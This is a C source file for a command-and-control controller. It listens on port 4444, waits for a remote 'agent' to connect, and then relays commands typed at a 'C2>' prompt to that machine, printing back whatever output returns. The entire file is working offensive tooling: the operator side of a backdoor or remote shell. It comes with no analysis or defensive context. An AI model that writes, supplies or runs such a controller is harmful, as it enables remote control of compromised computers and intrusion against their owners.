// controller.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4444
#define BUF_SIZE 4096

/* Send all bytes, handling partial writes and EINTR.
 * Returns 0 on success, -1 on error. */
static int send_all(int sock, const char *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t n = send(sock, buf + total, len - total, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            perror("send");
            return -1;
        }
        total += (size_t)n;
    }
    return 0;
}

int main(void) {
    int server_fd, client_fd, opt = 1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    char buffer[BUF_SIZE];

    memset(&addr, 0, sizeof(addr));

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
        perror("setsockopt"); /* non-fatal: keep going */

    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(server_fd);
        return EXIT_FAILURE;
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        close(server_fd);
        return EXIT_FAILURE;
    }

    printf("[+] Waiting for agent on port %d...\n", PORT);

    client_fd = accept(server_fd, (struct sockaddr *)&addr, &addr_len);
    if (client_fd < 0) {
        perror("accept");
        close(server_fd);
        return EXIT_FAILURE;
    }

    printf("[+] Agent connected from %s\n", inet_ntoa(addr.sin_addr));

    while (1) {
        ssize_t bytes;

        printf("C2> ");
        fflush(stdout);
        if (!fgets(buffer, BUF_SIZE, stdin))
            break;

        if (send_all(client_fd, buffer, strlen(buffer)) < 0)
            break;
        if (strncmp(buffer, "exit", 4) == 0)
            break;

        memset(buffer, 0, BUF_SIZE);
        bytes = recv(client_fd, buffer, BUF_SIZE - 1, 0);
        if (bytes < 0) {
            if (errno == EINTR)
                continue;
            perror("recv");
            break;
        }
        if (bytes == 0) {
            printf("[*] Agent closed the connection\n");
            break;
        }

        printf("%s", buffer);
    }

    if (close(client_fd) < 0)
        perror("close(client_fd)");
    if (close(server_fd) < 0)
        perror("close(server_fd)");
    return EXIT_SUCCESS;
}
